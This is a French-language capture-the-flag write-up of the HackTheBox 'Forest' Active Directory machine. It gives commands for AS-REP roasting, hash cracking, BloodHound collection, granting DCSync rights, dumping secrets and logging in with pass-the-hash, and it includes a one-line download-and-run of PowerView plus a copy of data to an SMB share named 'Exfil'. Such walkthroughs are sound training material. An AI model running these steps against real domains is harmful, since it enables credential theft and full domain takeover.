# Forest - Easy

```bash
Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-18 21:11 EST                                                                                                                               
Nmap scan report for 10.10.10.161                                                                                                                                                             
Host is up (0.028s latency).                                                                                                                                                                  
Not shown: 989 closed tcp ports (conn-refused)                                                                                                                                                
PORT     STATE SERVICE      VERSION                                                                                                                                                           
53/tcp   open  domain       Simple DNS Plus                                                                                                                                                   
88/tcp   open  kerberos-sec Microsoft Windows Kerberos (server time: 2023-01-18 20:18:36Z)                                                                                                    
135/tcp  open  msrpc        Microsoft Windows RPC                                                                                                                                             
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -3h12m52s, deviation: 4h37m08s, median: -5h52m52s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-time: 
|   date: 2023-01-18T20:18:42
|_  start_date: 2023-01-18T03:04:36
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: FOREST
|   NetBIOS computer name: FOREST\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: FOREST.htb.local
|_  System time: 2023-01-18T12:18:39-08:00
```

On remarque d’abord beaucoup de service mais on remarque surtout que c’est un AD avec kerberos notamment. SMB apparait dans la liste des scripts qui ont été lancé par nmap, seulement, en lançant smbmap on se rend compte que le port 445 est bien ouvert mais n’accepte pas les connexions anonymes. Même erreur en rajoutant le domaine trouvé

```bash
smbmap -H 10.10.10.161 -u anonymous
[!] Authentication error on 10.10.10.161
smbmap -H 10.10.10.161 -d htb.local -u anonymous
[!] Authentication error on 10.10.10.161
```

On essaye donc de ldapsearch. Ici on a extrait l’argument b à partir des scripts nmap, il est aussi possible de les extraire avec ldapsearch

```bash
ldapsearch -x -H ldap://10.10.10.161  -b "DC=htb,DC=local"
```

Il faut alors analyser le résultat pour voir si on ne peut pas trouver des descriptions contenant les mdp des users ou bien des indices.

Rien d’intéressant pour le moment cependant on trouve plusieurs users intéressants: sebastien, santi, lucinda, andy et mark. Nous avons également les dates de création des comptes et la date de la dernière modification des mots de passe.

Une possibilité est de bruteforce les accounts mais cela risque d’être très long sur du réseau avec rockyou …

On va donc essayer de dump plus d’informations sur le LDAP avant.

Utilisons crackmapexec pour dumb la password policy: 

```bash
crackmapexec smb 10.10.10.161 --pass-pol

/usr/lib/python3/dist-packages/paramiko/transport.py:219: CryptographyDeprecationWarning: Blowfish has been deprecated
  "class": algorithms.Blowfish,
SMB         10.10.10.161    445    FOREST           [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True)
SMB         10.10.10.161    445    FOREST           [+] Dumping password info for domain: HTB
SMB         10.10.10.161    445    FOREST           Minimum password length: 7
SMB         10.10.10.161    445    FOREST           Password history length: 24
SMB         10.10.10.161    445    FOREST           Maximum password age: Not Set
SMB         10.10.10.161    445    FOREST           
SMB         10.10.10.161    445    FOREST           Password Complexity Flags: 000000
SMB         10.10.10.161    445    FOREST               Domain Refuse Password Change: 0
SMB         10.10.10.161    445    FOREST               Domain Password Store Cleartext: 0
SMB         10.10.10.161    445    FOREST               Domain Password Lockout Admins: 0
SMB         10.10.10.161    445    FOREST               Domain Password No Clear Change: 0
SMB         10.10.10.161    445    FOREST               Domain Password No Anon Change: 0
SMB         10.10.10.161    445    FOREST               Domain Password Complex: 0
SMB         10.10.10.161    445    FOREST           
SMB         10.10.10.161    445    FOREST           Minimum password age: 1 day 4 minutes 
SMB         10.10.10.161    445    FOREST           Reset Account Lockout Counter: 30 minutes 
SMB         10.10.10.161    445    FOREST           Locked Account Duration: 30 minutes 
SMB         10.10.10.161    445    FOREST           Account Lockout Threshold: None
SMB         10.10.10.161    445    FOREST           Forced Log off Time: Not Set
```

La commande suivante nous permet aussi de lister les utilisateurs du domain et on trouve un nouvel utilisateur : svc-alfresco. Aucun nouveau share n’a été trouvé ni disponible.

```bash
crackmapexec smb 10.10.10.161 --users
```

Il est possible de faire les même opérations avec rpcclient.

On remarque que le paramètre Lockout Treshold est à none ce qui fait que l’on peut bruteforce. On peut donc lancer le bruteforce en arrière plan pendant que l’on cherche autre chose.

```bash

```

Un autre moyen de procéder peut être d’essayer de trouver le hash d’un mdp d’un des utilisateurs. Impacket permet de faire ça avec GetNPUsers. Cet utilitaire listera les utilisateurs pour qui ce critère est rempli:

```bash
Queries target domain for users with 'Do not require Kerberos preauthentication' set and export their TGTs for cracking
```

(Impacket comporte une liste d’exemples dans /usr/share/doc/python3-impacket/examples/)

```bash
GetNPUsers.py -dc-ip 10.10.10.161 -request 'htb.local/' -format hashcat
```

La réponse est donc que svc-alfresco est justement un user qui ne requiert pas de préauthentification (compte de service), on obtient donc le hash de son mdp dans le format hashcat comme demandé.

Il est maintenant possible de lancer hashcat pour cracker le mot de passe.

```bash
hashcat --force hash.txt /usr/share/wordlists/rockyou.txt -m 18200
```

Le -m vient de 

```bash
hashcat --example-hashes | grep -i krb
```

qui permet connaitre le mode en comparant avec les exemples.

On obtient alors rapidement le mot de passe du compte svc-alfredo et on va maintenant pouvoir essayer de se log avec evilwinrm par exemple.

```bash
evil-winrm -i 10.10.10.161 -u svc-alfresco
```

Et ça fonctionne, on peut maintenant récupérer le flag user.

Pour commencer on va lancer un serveur sur notre machine pour télécharger winPEAS sur la machine cible.

Rien d’intéressant dans le scan, en cherchant dans les fichiers on trouve le répertoire de sebastien dans C:/Users mais on a pas l’accès.

Rien de trouvé de spécial dans les fichiers non plus. On va donc utiliser bloodhound pour essayer de trouver quelque chose.

On télécharge bloodhound pour linux et on envoie ShardHound.exe sur la machine cible. On l’execute et on attend les résultats, en attendant il faut setup un SMB pour récupérer les résultats depuis le PC de la victime vers notre machine.

```bash
sudo impacket-smbserver Exfil $(pwd) -smb2support -user s1d1ou5 -password password
```

```powershell
$pass = convertto-securestring 'password' -AsPlainText -Force
$credentials = New-Object System.Management.Automation.PSCredential('s1d1ou5', $pass)
New-PSDrive -Name s1d1ou5 -PSProvider FileSystem -Credential $credentials -Root \\10.10.16.6\Exfil
copy 20230123114355_BloodHound.zip s1d1ou5:
```

Maintenant on peut dézipper et analyser le fichier.

```bash
sudo neo4j console
```

Et on se connecte au neo4j via bloodhound, on apprend alors par analyse des fichiers que svc-alfresco est membre de SERVICE ACCOUNTS qui est membre de PRIVILEGED IT ACCOUNTS qui est membre de ACCOUNT OPERATORS. Tous les autres utilisateurs sont derrière cet Account operator. 

```
Members of this group can create, modify, and delete accounts for users, groups, and computers located in the Users or Computers containers and organizational units in the domain, except the Domain Controllers organizational unit. Members of this group do not have permission to modify the Administrators or the Domain Admins groups, nor do they have permission to modify the accounts for members of those groups. Members of this group can log on locally to domain controllers in the domain and shut them down. Because this group has significant power in the domain, add users with caution
```

On va donc pouvoir créer un compte utilisateur.

```powershell
net user sidious password /add /domain
```

On voit également que ce groupe a un full control sur le groupe EXCHANGE WINDOWS PERMISSIONS via “reachable high value targets”. On va donc ajouter notre user à ce groupe pour faire un WriteDacl puis dump des mots de passes si possible.

```
The members of the group EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL have permissions to modify the DACL (Discretionary Access Control List) on the domain HTB.LOCAL
With write access to the target object's DACL, you can grant yourself any privilege you want on the object.
```

```powershell
net group "Exchange Windows Permissions" /add sidious
```

Pour utiliser les commandes founies par Bloodhound il nous faut PowerSploit (branche dev car plus récente). 

Pour obtenir directement le contenu d’un script:

```powershell
IEX(New-Object Net.WebClient).downloadString('http://IP:8000/PowerSploit/Recon/PowerView.ps1')
```

On suit les instructions bloodhound

```powershell
$SecPassword = ConvertTo-SecureString 'password' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('HTB\sidious', $SecPassword)
Add-DomainObjectAcl -Credential $Cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity sidious -Rights DCSync
```

Il faut ensuite utiliser SecretsDump de Impacket:

```bash
secretsdump.py htb/sidious@10.10.10.161
```

On extrait alors le hash du mdp admin qu’on extrait et qu’on utilise pour se log avec psexec.

```bash
psexec administrator@10.10.10.161 -hashes hash:hash
```

On est alors connecté en tant qu’admin et on peut récupérer le flag final !